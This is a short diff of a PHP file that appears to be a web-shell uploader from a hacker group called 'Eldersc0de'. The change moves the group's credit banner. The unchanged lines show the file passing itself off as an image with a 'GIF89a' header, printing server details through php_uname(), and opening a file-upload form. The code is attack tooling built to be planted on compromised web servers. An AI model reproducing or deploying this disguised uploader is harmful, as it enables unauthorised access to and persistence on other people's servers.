@@ -1,11 +1,3 @@
-#################################################
-#           reCoded by: Jakarta6etar            #
-#          Team: Eldersc0de Securi7y            #
-#         https://fb.com/jakarta.exploded.12    #
-#-----------------------------------------------#
-#    Thank's To IndoXploit and Xai Syndicate    #
-#################################################
-
 GIF89a;
 <html>
 <head>
@@ -45,6 +37,13 @@ div {
     <div class="footer">&copy; 2015 - 2018<br><span>Eldersc0de Family</span></div>
 </body>
 <?php 
+#################################################
+#           reCoded by: Jakarta6etar            #
+#          Team: Eldersc0de Securi7y            #
+#         https://fb.com/jakarta.exploded.12    #
+#-----------------------------------------------#
+#    Thank's To IndoXploit and Xai Syndicate    #
+#################################################
 echo "<center>";
 echo "<br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>
 
